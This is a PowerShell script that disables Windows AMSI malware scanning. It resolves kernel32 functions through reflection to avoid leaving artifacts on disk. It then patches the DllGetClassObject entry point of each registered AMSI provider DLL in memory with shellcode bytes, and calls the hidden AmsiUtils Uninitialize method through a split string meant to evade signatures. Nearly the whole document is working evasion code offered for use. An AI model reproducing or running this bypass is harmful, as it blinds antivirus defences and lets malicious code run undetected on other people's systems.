# Write-Host "AMSI providers' initialization interception"
# Write-Host "-- Maor Korkos (@maorkor)"

# Call Windows APIs with reflection (crediton reflection: http://redteam.cafe/red-team/powershell/using-reflection-for-amsi-bypass)
# Add-Type causes the code to be written to a temporary file on the disk, then csc.exe is used to compile this code into a binary
# Artifacts on disk may cause AV detection, solution - reflection

# Providers registry enumeration implemented by: https://github.com/R-Secure/AMSI-Bypasses

function Get-ProcAddress {
    Param(
        [Parameter(Position = 0, Mandatory = $True)] [String] $Module,
        [Parameter(Position = 1, Mandatory = $True)] [String] $Procedure
    )

    # Get a reference to System.dll in the GAC
    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
    # Get a reference to the GetModuleHandle and GetProcAddress methods
    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))
    # Get a handle to the module specified
    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
    $tmpPtr = New-Object IntPtr
    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
    # Return the address of the function
    return $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
}
function Get-DelegateType
{
    Param
    (
        [OutputType([Type])]
            
        [Parameter( Position = 0)]
        [Type[]]
        $Parameters = (New-Object Type[](0)),
            
        [Parameter( Position = 1 )]
        [Type]
        $ReturnType = [Void]
    )

    $Domain = [AppDomain]::CurrentDomain
    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
        
    Write-Output $TypeBuilder.CreateType()
}
$LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
$LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
$LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr,
$LoadLibraryDelegate)
$GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
$GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
$GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr,
$GetProcAddressDelegate)
$VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
$VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr,
$VirtualProtectDelegate)

$Patch = [Byte[]] (0x31, 0xC0, 0x05, 0x78, 0x01, 0x19, 0x7F, 0x05, 0xDF, 0xFE, 0xED, 0x00, 0xC3)
$p = 0

foreach ($provider in Get-ChildItem  HKLM:\SOFTWARE\Microsoft\AMSI\Providers -Name)
{
    $registry = 'HKLM:\Software\Classes\CLSID\' + $provider + '\InprocServer32'
    $dllPath = Get-ItemPropertyValue -Name '(Default)' $registry -ErrorAction SilentlyContinue
    if ($dllPath)
    {
        $providerDLL = Split-Path $dllPath -leaf
        $dll = $providerDLL -replace '"', ""
        $hDLL = $LoadLibrary.Invoke($dll) 
        if ($hdll -ne 0)
        {
            Write-host "[*] Provider found - " $providerDLL
            $Address = $GetProcAddress.Invoke($hDLL, "DllGetClassObject")        
            $VirtualProtect.Invoke($Address, [uint32]$Patch.Length, 0x40, [ref]$p)
            [System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, $Patch.Length)
        }
    }
}

$object = [Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils')
$Uninitialize = $object.GetMethods("NonPublic,static") | Where-Object Name -eq Uninitialize
$Uninitialize.Invoke($object,$null)
